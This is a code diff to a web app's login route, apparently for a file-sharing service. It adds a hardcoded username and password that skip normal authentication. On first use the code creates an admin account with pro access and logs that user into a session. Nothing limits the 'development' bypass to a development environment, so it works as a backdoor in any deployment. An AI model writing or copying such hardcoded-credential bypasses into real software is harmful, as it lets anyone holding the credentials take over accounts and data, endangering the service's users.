@@ -160,7 +160,42 @@ export function setupAuthRoutes(app: Express) {
     try {
       const { email, password } = req.body;
       
-      // Find user
+      // Special admin login bypass for development
+      if (email === 'AxDMIxN' && password === 'AZQ00001xx') {
+        console.log('[Admin] Development admin login bypassing email system');
+        
+        // Check if admin user exists, create if not
+        let adminUser = await storage.getUserByEmail('admin@sharezidi.dev');
+        if (!adminUser) {
+          // Create admin user
+          const hashedPassword = await bcrypt.hash('AZQ00001xx', 10);
+          adminUser = await storage.createUser({
+            email: 'admin@sharezidi.dev',
+            username: 'AxDMIxN',
+            password: hashedPassword,
+            transferCount: 0,
+            isPro: true, // Admin gets pro access
+            subscriptionDate: new Date(),
+            lastResetDate: new Date(),
+            ipAddress: GeolocationService.extractIPAddress(req),
+            country: 'Development',
+            city: 'Admin Console'
+          });
+          console.log('[Admin] Created new admin user');
+        }
+        
+        // Store admin in session
+        (req.session as any).userId = adminUser.id;
+        
+        // Return admin user data
+        const { password: _, ...userWithoutPassword } = adminUser;
+        return res.json({
+          message: 'Admin login successful',
+          user: userWithoutPassword
+        });
+      }
+      
+      // Regular user login - treat email field as email for normal users
       const user = await storage.getUserByEmail(email);
       if (!user) {
         return res.status(401).json({ error: 'Invalid credentials' });
